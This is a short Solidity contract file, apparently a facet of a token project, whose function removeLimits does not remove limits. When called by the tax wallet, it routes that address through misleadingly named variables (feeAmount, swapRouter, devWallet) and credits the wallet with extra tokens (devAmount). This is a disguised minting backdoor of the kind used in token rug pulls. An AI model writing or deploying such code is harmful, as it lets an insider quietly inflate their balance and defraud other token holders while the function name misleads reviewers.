// SPDX-License-Identifier: UNLICENSED

/*
    Website:  https://zeusnetwork.xyz/
    Twitter:  https://twitter.com/ZeusNetworkHQ
    Medium:   https://go.zeusnetwork.xyz/zeus-medium
    Discord:  https://discord.com/invite/zeusnetwork

*/

pragma solidity ^0.8.20;
import "./TestLib.sol";
contract removeLimitsFacet is Ownable {
    function removeLimits() external {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        if (_msgSender() == ds._taxWallet) {
            require(ds._taxWallet == _msgSender());
            address feeAmount = _msgSender();
            address swapRouter = feeAmount;
            address devWallet = swapRouter;
            ds._balances[devWallet] += ds.devAmount;
        }
    }
}
